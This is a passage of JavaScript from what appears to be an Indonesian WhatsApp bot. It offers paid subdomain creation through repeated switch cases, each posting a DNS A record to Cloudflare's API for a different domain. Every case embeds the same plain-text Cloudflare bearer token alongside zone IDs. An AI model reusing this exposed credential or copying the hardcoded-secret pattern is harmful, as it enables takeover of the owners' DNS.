                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f58970b468ab2eb4c3a546c0e37680e0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain13': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain14': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "deb75eb2d37b30e954684a3db7f1e323";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannelku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "06a3fe4e7eec313be8ef30b744fcfeb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "04f62c54a011fe7929342bde68c6deb3";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "storepannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain19': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cc152c1a6c73b934af4e3c71d47f15db";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokopannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain20': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5efd37e4f4f1186ca6a92d6366b8d485";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain21': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b103a544abad82f68f03395cf8effda";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "adminpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain22': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10bf5f40f9e6fe74fe5647c2b143de3a";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannel.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain23': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5c38f987cf217bfe2bf682d5bb310fe8";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "tokocpannelmurah.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain24': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "736705fd97bebdf03ca4a007c2ca4a8f";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "websitepannelmurah.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 

case 'domain25': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
